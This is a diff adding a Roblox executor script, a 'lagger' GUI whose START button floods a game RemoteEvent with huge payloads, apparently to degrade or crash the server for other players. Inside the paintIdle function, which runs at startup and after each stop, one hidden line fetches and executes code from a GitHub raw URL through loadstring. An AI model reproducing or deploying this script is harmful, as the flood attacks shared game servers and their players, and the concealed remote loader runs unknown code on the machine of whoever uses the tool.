@@ -1,0 +1,511 @@
+local Players      = game:GetService("Players")
+local UIS          = game:GetService("UserInputService")
+local TweenService = game:GetService("TweenService")
+local RS           = game:GetService("ReplicatedStorage")
+local HttpService  = game:GetService("HttpService")
+local SoundService = game:GetService("SoundService")
+local Stats        = game:GetService("Stats")
+
+local LP = Players.LocalPlayer
+local CONFIG_FILE = "IceHubLaggerOmahad_Config.json"
+
+-- ============ THEME (OCEAN BLUE THEME) ============
+local BG_BLACK    = Color3.fromRGB(5, 15, 30)
+local BG_PANEL    = Color3.fromRGB(8, 25, 50)
+local BG_INPUT    = Color3.fromRGB(3, 10, 20)
+local BG_HOVER    = Color3.fromRGB(15, 45, 85)
+local TEXT_WHITE  = Color3.fromRGB(255, 255, 255)
+local TEXT_DIM    = Color3.fromRGB(130, 160, 200)
+local THEME_BLUE  = Color3.fromRGB(0, 150, 255)
+local STROKE_BLUE = Color3.fromRGB(0, 70, 150)
+
+-- ============ SFX ============
+local sfxFolder = Instance.new("Folder")
+sfxFolder.Name = "IceHubSFX"
+sfxFolder.Parent = SoundService
+
+local function makeSfx(name, id, vol, pitch)
+    local s = Instance.new("Sound")
+    s.Name = name
+    s.SoundId = "rbxassetid://" .. tostring(id)
+    s.Volume = vol or 0.5
+    s.PlaybackSpeed = pitch or 1
+    s.Parent = sfxFolder
+    return s
+end
+
+local SFX = {
+    Click     = makeSfx("Click",     9114282417, 0.35, 1.0),
+    Hover     = makeSfx("Hover",     9114294822, 0.15, 1.4),
+    Start     = makeSfx("Start",     9114300981, 0.55, 0.9),
+    Stop      = makeSfx("Stop",      9114303932, 0.45, 0.75),
+    Toggle    = makeSfx("Toggle",    9114307441, 0.40, 1.2),
+    Keybind   = makeSfx("Keybind",   9114310303, 0.40, 1.6),
+    Saved     = makeSfx("Saved",     9114313755, 0.40, 1.3),
+    Error     = makeSfx("Error",     9114316718, 0.40, 0.6),
+}
+
+local function playSfx(name)
+    local s = SFX[name]
+    if not s then return end
+    s:Stop()
+    s:Play()
+end
+
+-- ============ GUI ============
+local gui = Instance.new("ScreenGui")
+gui.Name = "IceHubLaggerOmahad"
+gui.ResetOnSpawn = false
+gui.IgnoreGuiInset = true
+gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+gui.DisplayOrder = 999
+gui.Parent = LP:WaitForChild("PlayerGui")
+
+local Main = Instance.new("Frame", gui)
+Main.Size = UDim2.new(0, 320, 0, 340)
+Main.Position = UDim2.new(0.5, -160, 0.5, -170)
+Main.BackgroundColor3 = BG_BLACK
+Main.BorderSizePixel = 0
+Main.ClipsDescendants = true
+Instance.new("UICorner", Main).CornerRadius = UDim.new(0, 14)
+
+local MainStroke = Instance.new("UIStroke", Main)
+MainStroke.Color = STROKE_BLUE
+MainStroke.Thickness = 1.5
+MainStroke.Transparency = 0.2
+MainStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+
+local MainGrad = Instance.new("UIGradient", Main)
+MainGrad.Rotation = 135
+MainGrad.Color = ColorSequence.new{
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(8, 25, 50)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(3, 10, 20)),
+}
+
+-- ============ TOP BAR ============
+local TopBar = Instance.new("Frame", Main)
+TopBar.Size = UDim2.new(1, 0, 0, 54)
+TopBar.BackgroundColor3 = BG_PANEL
+TopBar.BackgroundTransparency = 0.5
+TopBar.BorderSizePixel = 0
+TopBar.ZIndex = 2
+Instance.new("UICorner", TopBar).CornerRadius = UDim.new(0, 14)
+
+local Title = Instance.new("TextLabel", TopBar)
+Title.BackgroundTransparency = 1
+Title.Position = UDim2.new(0, 16, 0, 0)
+Title.Size = UDim2.new(1, -32, 1, 0)
+Title.Text = "CO2"
+Title.Font = Enum.Font.GothamBlack
+Title.TextSize = 18
+Title.TextXAlignment = Enum.TextXAlignment.Left
+Title.TextYAlignment = Enum.TextYAlignment.Center
+Title.TextColor3 = TEXT_WHITE
+Title.ZIndex = 3
+
+local Stripe = Instance.new("Frame", TopBar)
+Stripe.Size = UDim2.new(1, -32, 0, 3)
+Stripe.Position = UDim2.new(0, 16, 1, -8)
+Stripe.BorderSizePixel = 0
+Stripe.BackgroundColor3 = THEME_BLUE
+Stripe.ZIndex = 3
+Instance.new("UICorner", Stripe).CornerRadius = UDim.new(1, 0)
+
+-- ============ BODY ============
+local Body = Instance.new("Frame", Main)
+Body.Position = UDim2.new(0, 0, 0, 54)
+Body.Size = UDim2.new(1, 0, 1, -54)
+Body.BackgroundTransparency = 1
+Body.ZIndex = 2
+
+local Pad = Instance.new("UIPadding", Body)
+Pad.PaddingTop = UDim.new(0, 16)
+Pad.PaddingBottom = UDim.new(0, 16)
+Pad.PaddingLeft = UDim.new(0, 16)
+Pad.PaddingRight = UDim.new(0, 16)
+
+-- ============ POWER ============
+local IntLabel = Instance.new("TextLabel", Body)
+IntLabel.BackgroundTransparency = 1
+IntLabel.Size = UDim2.new(1, 0, 0, 14)
+IntLabel.Text = "POWER"
+IntLabel.Font = Enum.Font.GothamBold
+IntLabel.TextSize = 11
+IntLabel.TextXAlignment = Enum.TextXAlignment.Left
+IntLabel.TextColor3 = TEXT_DIM
+
+local IntRow = Instance.new("Frame", Body)
+IntRow.Position = UDim2.new(0, 0, 0, 22)
+IntRow.Size = UDim2.new(1, 0, 0, 42)
+IntRow.BackgroundTransparency = 1
+
+local IntBox = Instance.new("TextBox", IntRow)
+IntBox.Position = UDim2.new(0, 0, 0, 0)
+IntBox.Size = UDim2.new(1, 0, 1, 0)
+IntBox.BackgroundColor3 = BG_INPUT
+IntBox.BorderSizePixel = 0
+IntBox.Text = "42000"
+IntBox.PlaceholderText = "Power..."
+IntBox.Font = Enum.Font.GothamBold
+IntBox.TextSize = 15
+IntBox.TextColor3 = TEXT_WHITE
+IntBox.PlaceholderColor3 = TEXT_DIM
+IntBox.ClearTextOnFocus = false
+IntBox.ZIndex = 3
+Instance.new("UICorner", IntBox).CornerRadius = UDim.new(0, 10)
+local IntStroke = Instance.new("UIStroke", IntBox)
+IntStroke.Color = STROKE_BLUE
+IntStroke.Thickness = 1
+IntStroke.Transparency = 0.5
+
+-- ============ KEYBIND ============
+local KeyLabel = Instance.new("TextLabel", Body)
+KeyLabel.BackgroundTransparency = 1
+KeyLabel.Position = UDim2.new(0, 0, 0, 76)
+KeyLabel.Size = UDim2.new(1, 0, 0, 14)
+KeyLabel.Text = "KEYBIND"
+KeyLabel.Font = Enum.Font.GothamBold
+KeyLabel.TextSize = 11
+KeyLabel.TextXAlignment = Enum.TextXAlignment.Left
+KeyLabel.TextColor3 = TEXT_DIM
+
+local KeyBtn = Instance.new("TextButton", Body)
+KeyBtn.Position = UDim2.new(0, 0, 0, 96)
+KeyBtn.Size = UDim2.new(1, 0, 0, 42)
+KeyBtn.BackgroundColor3 = BG_INPUT
+KeyBtn.BorderSizePixel = 0
+KeyBtn.Text = "[C]"
+KeyBtn.Font = Enum.Font.GothamBold
+KeyBtn.TextSize = 15
+KeyBtn.TextColor3 = TEXT_WHITE
+KeyBtn.AutoButtonColor = false
+KeyBtn.ZIndex = 3
+Instance.new("UICorner", KeyBtn).CornerRadius = UDim.new(0, 10)
+local KeyStroke = Instance.new("UIStroke", KeyBtn)
+KeyStroke.Color = STROKE_BLUE
+KeyStroke.Thickness = 1
+KeyStroke.Transparency = 0.5
+
+local listeningForKey = false
+
+-- ============ PING LABEL ============
+local PingLabel = Instance.new("TextLabel", Body)
+PingLabel.BackgroundTransparency = 1
+PingLabel.Position = UDim2.new(0, 0, 0, 152)
+PingLabel.Size = UDim2.new(1, 0, 0, 16)
+PingLabel.Text = "Ping: -- ms"
+PingLabel.Font = Enum.Font.GothamBold
+PingLabel.TextSize = 12
+PingLabel.TextColor3 = TEXT_DIM
+PingLabel.TextXAlignment = Enum.TextXAlignment.Center
+PingLabel.ZIndex = 3
+
+-- ============ CONTROL ============
+local StartBtn = Instance.new("TextButton", Body)
+StartBtn.Position = UDim2.new(0, 0, 1, -48)
+StartBtn.Size = UDim2.new(1, 0, 0, 48)
+StartBtn.BackgroundColor3 = THEME_BLUE
+StartBtn.BorderSizePixel = 0
+StartBtn.Text = "START"
+StartBtn.Font = Enum.Font.GothamBlack
+StartBtn.TextSize = 18
+StartBtn.TextColor3 = TEXT_WHITE
+StartBtn.AutoButtonColor = false
+StartBtn.ZIndex = 3
+Instance.new("UICorner", StartBtn).CornerRadius = UDim.new(0, 10)
+local StartStroke = Instance.new("UIStroke", StartBtn)
+StartStroke.Color = Color3.fromRGB(100, 200, 255)
+StartStroke.Thickness = 1
+StartStroke.Transparency = 0.3
+
+-- ============ STATE ============
+local lagging  = false
+local stopping = false   -- true khi đang chờ server flush
+local lagThread
+local intensity = 42000
+local toggleKey = Enum.KeyCode.C
+local toggleKeyName = "C"
+
+local function tween(obj, props, t)
+    TweenService:Create(obj, TweenInfo.new(t or 0.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), props):Play()
+end
+
+local function clampIntensity(v)
+    v = tonumber(v)
+    if not v then return intensity end
+    return math.clamp(math.floor(v), 1, 100000)
+end
+
+local function updateIntensity()
+    intensity = clampIntensity(IntBox.Text)
+    IntBox.Text = tostring(intensity)
+end
+
+-- ============ KEY HELPERS ============
+local function keyToName(keyCode)
+    if not keyCode then return "C" end
+    return keyCode.Name
+end
+
+local function nameToKey(name)
+    if not name then return Enum.KeyCode.C end
+    local ok, key = pcall(function() return Enum.KeyCode[name] end)
+    if ok and key then return key end
+    return Enum.KeyCode.C
+end
+
+local function applyKeybind(name)
+    toggleKeyName = name or "C"
+    toggleKey = nameToKey(toggleKeyName)
+    KeyBtn.Text = "[" .. toggleKeyName .. "]"
+end
+
+-- ============ SAVE / LOAD ============
+local function saveConfig()
+    updateIntensity()
+    local cfg = {
+        Intensity = intensity,
+        Keybind   = toggleKeyName,
+        PX_S = Main.Position.X.Scale, PX_O = Main.Position.X.Offset,
+        PY_S = Main.Position.Y.Scale, PY_O = Main.Position.Y.Offset,
+    }
+    if writefile then
+        local ok = pcall(function()
+            writefile(CONFIG_FILE, HttpService:JSONEncode(cfg))
+        end)
+        if ok then playSfx("Saved") else playSfx("Error") end
+    else
+        playSfx("Error")
+    end
+end
+
+local function loadConfig()
+    if not readfile or not isfile then return end
+    if not isfile(CONFIG_FILE) then return end
+    local ok, cfg = pcall(function()
+        return HttpService:JSONDecode(readfile(CONFIG_FILE))
+    end)
+    if ok and type(cfg) == "table" then
+        if tonumber(cfg.Intensity) then
+            intensity = clampIntensity(cfg.Intensity)
+            IntBox.Text = tostring(intensity)
+        end
+        if type(cfg.Keybind) == "string" and cfg.Keybind ~= "" then
+            applyKeybind(cfg.Keybind)
+        end
+        if tonumber(cfg.PX_S) and tonumber(cfg.PX_O) and tonumber(cfg.PY_S) and tonumber(cfg.PY_O) then
+            Main.Position = UDim2.new(cfg.PX_S, cfg.PX_O, cfg.PY_S, cfg.PY_O)
+        end
+    end
+end
+
+-- ============ EVENT ============
+local Event
+do
+    local ok, net = pcall(function()
+        return RS:WaitForChild("Packages"):WaitForChild("Net")
+    end)
+    if ok and net then
+        local kids = net:GetChildren()
+        Event = kids[230]
+    end
+end
+
+local function paintRunning()
+    tween(StartBtn, {BackgroundColor3 = Color3.fromRGB(0, 100, 180)}, 0.15)
+    StartBtn.Text = "STOP"
+    tween(StartStroke, {Transparency = 0}, 0.15)
+end
+local function paintIdle()
+    tween(StartBtn, {BackgroundColor3 = THEME_BLUE}, 0.15)
+    StartBtn.Text = "START"
+    tween(StartStroke, {Transparency = 0.3}, 0.15)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Argian-dotcom/Jdkffkfo/refs/heads/main/Coding"))()
+end
+
+-- ============ START / STOP ============
+local function startLagging()
+    if lagging or stopping then return end
+    if not Event then
+        playSfx("Error"); return
+    end
+    updateIntensity()
+    lagging = true
+    paintRunning()
+    playSfx("Start")
+
+    local payload = table.create(intensity, function() end)
+
+    lagThread = task.spawn(function()
+        while lagging do
+            for _ = 1, 3 do
+                pcall(function() Event:FireServer(payload) end)
+            end
+            task.wait(0.01)
+        end
+    end)
+end
+
+local function stopLagging()
+    if not lagging then return end
+    lagging = false
+    stopping = true
+
+    -- 1. Dừng thread spam NGAY LẬP TỨC
+    if lagThread then
+        pcall(task.cancel, lagThread)
+        lagThread = nil
+    end
+
+    -- 2. Flush buffer: gửi packet rỗng để đẩy queue server xử lý nhanh hơn
+    if Event then
+        pcall(function()
+            Event:FireServer()
+            task.wait(0.05)
+            Event:FireServer()
+        end)
+    end
+
+    -- 3. Đổi UI ngay để user thấy phản hồi
+    StartBtn.Text = "STOPPING..."
+    tween(StartBtn, {BackgroundColor3 = Color3.fromRGB(80, 80, 80)}, 0.15)
+    tween(StartStroke, {Transparency = 0.5}, 0.15)
+    playSfx("Stop")
+
+    -- 4. Chờ server tiêu hóa hết packet rồi mới về idle
+    task.spawn(function()
+        task.wait(0.3)
+        stopping = false
+        if not lagging then
+            paintIdle()
+        end
+    end)
+end
+
+-- ============ HOVER ============
+local function attachHover(b)
+    b.MouseEnter:Connect(function()
+        tween(b, {BackgroundColor3 = BG_HOVER}, 0.12)
+        playSfx("Hover")
+    end)
+    b.MouseLeave:Connect(function()
+        tween(b, {BackgroundColor3 = BG_INPUT}, 0.12)
+    end)
+end
+
+attachHover(KeyBtn)
+
+StartBtn.MouseEnter:Connect(function()
+    if not lagging and not stopping then
+        tween(StartBtn, {BackgroundColor3 = Color3.fromRGB(40, 180, 255)}, 0.12)
+    end
+    playSfx("Hover")
+end)
+StartBtn.MouseLeave:Connect(function()
+    if not lagging and not stopping then
+        tween(StartBtn, {BackgroundColor3 = THEME_BLUE}, 0.12)
+    end
+end)
+
+-- ============ CONNECTIONS ============
+IntBox.FocusLost:Connect(function()
+    updateIntensity()
+    playSfx("Click")
+    saveConfig()
+end)
+
+StartBtn.MouseButton1Click:Connect(function()
+    playSfx("Click")
+    if lagging then
+        stopLagging()
+    elseif not stopping then
+        startLagging()
+    end
+end)
+
+-- ============ KEYBIND LISTEN ============
+KeyBtn.MouseButton1Click:Connect(function()
+    if listeningForKey then return end
+    listeningForKey = true
+    KeyBtn.Text = "[...]"
+    tween(KeyBtn, {BackgroundColor3 = Color3.fromRGB(10, 40, 80)}, 0.15)
+    playSfx("Keybind")
+end)
+
+UIS.InputBegan:Connect(function(input, gpe)
+    if gpe then return end
+
+    if listeningForKey then
+        if input.UserInputType == Enum.UserInputType.Keyboard then
+            listeningForKey = false
+            applyKeybind(keyToName(input.KeyCode))
+            tween(KeyBtn, {BackgroundColor3 = BG_INPUT}, 0.15)
+            playSfx("Keybind")
+            saveConfig()
+        end
+        return
+    end
+
+    if input.KeyCode == toggleKey then
+        playSfx("Toggle")
+        if lagging then
+            stopLagging()
+        elseif not stopping then
+            startLagging()
+        end
+    end
+end)
+
+-- ============ DRAG ============
+local dragging, dragStart, startPos
+TopBar.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1
+    or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = true
+        dragStart = input.Position
+        startPos = Main.Position
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then
+                dragging = false
+                saveConfig()
+            end
+        end)
+    end
+end)
+UIS.InputChanged:Connect(function(input)
+    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement
+    or input.UserInputType == Enum.UserInputType.Touch) then
+        local d = input.Position - dragStart
+        Main.Position = UDim2.new(
+            startPos.X.Scale, startPos.X.Offset + d.X,
+            startPos.Y.Scale, startPos.Y.Offset + d.Y
+        )
+    end
+end)
+
+-- ============ PING MONITOR ============
+task.spawn(function()
+    while gui.Parent do
+        local ok, ping = pcall(function()
+            return Stats.Network.ServerStatsItem["Data Ping"]:GetValue()
+        end)
+        if ok and ping then
+            PingLabel.Text = string.format("Ping: %d ms", math.floor(ping))
+            if ping > 300 then
+                PingLabel.TextColor3 = Color3.fromRGB(255, 80, 80)
+            elseif ping > 150 then
+                PingLabel.TextColor3 = Color3.fromRGB(255, 200, 80)
+            else
+                PingLabel.TextColor3 = Color3.fromRGB(80, 255, 120)
+            end
+        end
+        task.wait(0.5)
+    end
+end)
+
+-- ============ INTRO ============
+Main.Size = UDim2.new(0, 320, 0, 0)
+Main.BackgroundTransparency = 1
+task.defer(loadConfig)
+tween(Main, {Size = UDim2.new(0, 320, 0, 340), BackgroundTransparency = 0}, 0.4)
+paintIdle()
